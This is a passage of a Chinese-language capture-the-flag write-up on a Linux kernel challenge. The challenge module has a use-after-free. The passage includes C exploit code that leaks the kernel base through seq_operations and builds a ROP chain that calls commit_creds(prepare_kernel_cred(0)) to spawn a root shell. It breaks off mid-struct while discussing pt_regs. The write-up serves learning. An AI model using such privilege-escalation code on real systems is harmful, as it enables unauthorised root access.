class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu host,+smep,+smap \</span><br><span class="line">        -smp cores=1 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -hda rootfs.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor none \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -enable-kvm \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure><ul><li>ext4 é•œåƒæŒ‚è½½</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"></span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹initï¼Œ etc&#x2F;init.d ä¸‹çš„æ–‡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chmod</span> 700 /root</span><br><span class="line"><span class="built_in">chown</span> -R ctf:ctf /home/ctf</span><br><span class="line"><span class="built_in">chown</span> root:root /root/flag</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"></span><br><span class="line">insmod /root/mmsg.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/mmsg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"><span class="comment"># setsid cttyhack su ctf -c /bin/sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><ul><li>ä¿®æ”¹å†…å®¹ï¼Œå°†koæ–‡ä»¶æ‹·è´ä¸€ä»½ï¼Œetc&#x2F;init.d&#x2F;rcSå†…å®¹ä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åumountï¼Œå¯åŠ¨ã€‚ï¼ˆä¿®æ”¹æ•ˆæœç”Ÿæ•ˆå¿…é¡»è¦<strong>umount</strong>ï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount ./rootfs</span><br></pre></td></tr></table></figure><ul><li>å†…æ ¸ç‰ˆæœ¬ <code>5.10.186</code></li></ul><h2 id="step2-ko"><a href="#step2-ko" class="headerlink" title="step2: ko"></a>step2: ko</h2><ul><li>é€†å‘åˆ†ækoæ–‡ä»¶ï¼ˆç›´æ¥ç»™å‡ºäº†cæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸çœ‹ï¼‰ã€‚æ¼æ´æ‰€åœ¨çš„åœ°æ–¹ï¼Œç±»ä¼¼å…¥é—¨ç»å…¸é¢˜ç›®<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>ã€‚ä½†æ˜¯ç»“æ„ä½“å¤§å°0x20</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> *<span class="title">mmsg_head</span>;</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">mmsg_device</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> &#123;</span><br><span class="line">Â  Â  kfree(mmsg_head);</span><br><span class="line">Â  Â  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mmsg_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    mmsg_device.minor = MISC_DYNAMIC_MINOR;</span><br><span class="line">    mmsg_device.name = DEVICE_NAME;</span><br><span class="line">    mmsg_device.fops = &amp;module_fops;</span><br><span class="line">    misc_register(&amp;mmsg_device);</span><br><span class="line">    mmsg_head = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_head), GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strncpy</span>(mmsg_head-&gt;description, DEVICE_NAME <span class="string">&quot;-mmsg_head&quot;</span>, <span class="number">15</span>);</span><br><span class="line">    INIT_LIST_HEAD(&amp;mmsg_head-&gt;<span class="built_in">list</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mmsg_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;mmsg_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li></li></ul><h2 id="step3-exploit"><a href="#step3-exploit" class="headerlink" title="step3: exploit"></a>step3: exploit</h2><ul><li>å°è¯•ROPï¼Œä½†æ˜¯ä¸å¤ªä¼šğŸ¤¡</li></ul><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>åŸæ–‡å†…å®¹ï¼š <a href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">ã€ŒPWNã€å†…æ ¸ PWN é¢˜ç›®çš„ç¬¬ä¸€æ¬¡å°è¯•</a></p><ul><li>åƒï¼Œå¾ˆåƒå‘€ã€‚çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°åŠå…¶ç±»ä¼¼ï¼Œäºæ˜¯å°è¯•ä½¿ç”¨ç±»ä¼¼çš„expè¿›è¡Œåš</li><li>è°ƒè¯•ï¼Œæ‰¾åœ°å€ï¼Œå…ˆå…³é—­kaslrï¼Œé€šè¿‡æ³„éœ²è·å¾—offset</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  gcc exp.c -static -o exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev_name = <span class="string">&quot;/dev/mmsg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel base =&gt;  cat /proc/kallsyms | grep startup_64</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokalr kernel base</span></span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cat /sys/module/mmsg/sections/.text</span></span><br><span class="line"><span class="comment"> * 0xffffffffc03f5000</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// close kaslr</span></span><br><span class="line"><span class="comment">// grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="comment">// grep commit_creds  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff9248d350</span>;</span><br><span class="line"><span class="comment">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"><span class="comment">//  grep native_write_cr4 /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> native_write_cr4 = <span class="number">0xffffffffa8832250</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ropper</span></span><br><span class="line"><span class="comment">// pop rdi; ret</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff812274dd</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82d63c0d: mov edi, eax; call rbx;</span></span><br><span class="line"><span class="comment">// åœ¨ 64 ä½ç¯å¢ƒä¸‹ï¼Œç›®çš„å¯„å­˜å™¨è‹¥æ˜¯ 32 ä½ï¼Œåˆ™ä¼šå°†é«˜ 32 ä½æ¸…é›¶</span></span><br><span class="line"><span class="type">size_t</span> mov_edi_eax_call_rbx = <span class="number">0xffffffff82d63c0d</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82e6f708: pop rbx; ret; </span></span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff82e6f708</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">  <span class="type">int</span> top;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">new</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_mmsg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *addr)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  arg.data = addr;</span><br><span class="line">  ioctl(fd, <span class="number">0x5555555</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_mmsg</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  arg.data = (<span class="type">char</span> *)buf;</span><br><span class="line">  ioctl(fd, <span class="number">0x6666666</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line"> <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">   <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line">   <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">   : <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_rsp)</span><br><span class="line">   : </span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;[x] seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">()</span> &#123;</span><br><span class="line">    fd1 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd2 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_base</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// read æ“ä½œï¼Œç»è¿‡å‡½æ•°è°ƒç”¨é“¾åˆ™ä¼šæœ€ç»ˆè°ƒç”¨ seq_operations-&gt;start æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°</span></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line">    get_mmsg(fd2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;buf[%d] =&gt; 0x%llx\n&quot;</span>, j, buf[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base =&gt; 0x%llx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status(); </span><br><span class="line">    uaf();</span><br><span class="line">    leak_base();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>rop</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¹‹å‰çš„éƒ½ä¸€æ ·</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> o(x) (x+kernel_offset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// smep userspaceåœ°å€è¢«æ ‡è®°ä¸ºnon-executable</span></span><br><span class="line">    <span class="comment">// bypass: stack prviot</span></span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x40</span>];</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> user_rip = (<span class="type">size_t</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    payload[idx++] = o(pop_rbx_ret);</span><br><span class="line">    payload[idx++] = o(commit_creds);</span><br><span class="line">    payload[idx++] = o(pop_rdi_ret); <span class="comment">// return address</span></span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = o(prepare_kernel_cred);</span><br><span class="line">    payload[idx++] = o(mov_edi_eax_call_rbx);</span><br><span class="line">    payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + <span class="number">22</span>; </span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = user_rip;</span><br><span class="line">    payload[idx++] = user_cs;</span><br><span class="line">    payload[idx++] = user_rflags;</span><br><span class="line">    payload[idx++] = user_rsp;</span><br><span class="line">    payload[idx++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    put_mmsg(fd2, (<span class="type">char</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger seq_file-&gt;start</span></span><br><span class="line">    read(seq_fd, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>ä½¿ç”¨xchg è¿›è¡Œç±»ä¼¼æ ˆè¿ç§»çš„æ“ä½œï¼Œä»è€Œè¿›è¡ŒåŠ«æŒå‡½æ•°æ‰§è¡Œæµ</p></li><li><p>åœ¨æœ¬åœ°æ‰§è¡Œæ—¶ï¼Œç›´æ¥kernel panicã€‚æŸ¥çœ‹æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æ˜¯<code>can&#39;t access memory in 0x????(æ˜¯ä¸ªç”¨æˆ·åœ°å€)</code>ã€‚</p></li></ul><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>åæ¥çœ‹æ¥ä¸€ä¸‹è¿™ç¯‡æ–‡ç« å‘ç°åŸå› ï¼š<a href="https://blog.wingszeng.top/kernel-pwn-struct-seq-operations-and-struct-pt-regs/#%E4%BE%8B%E9%A2%98-2023-pwnhub-%E5%85%AC%E5%BC%80%E8%B5%9B-kheap">Kernel Pwn Struct seq_operations and Struct pt_regs</a></p><ul><li>è¿™ä¸€é¢˜å¼€å¯äº†smapï¼Œè€Œ pwnhub çš„é‚£ä¸€é¢˜ä¸­æ²¡æœ‰ã€‚è€Œsmap: kernel space ä¸èƒ½ access user space çš„ä¸œè¥¿ã€‚</li><li>è¿™ç¯‡æ–‡ç« ä¸­è¯´äº†ä¸€ä¸ª <code>pt_regs</code> çš„ç»“æ„ä½“ï¼Œåœ¨ä½¿ç”¨syscall æ—¶ï¼Œä¼šå°†æŸäº›å¯„å­˜å™¨å†…å®¹å‹å…¥<code>å†…æ ¸æ ˆçš„æ ˆåº•</code>.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span 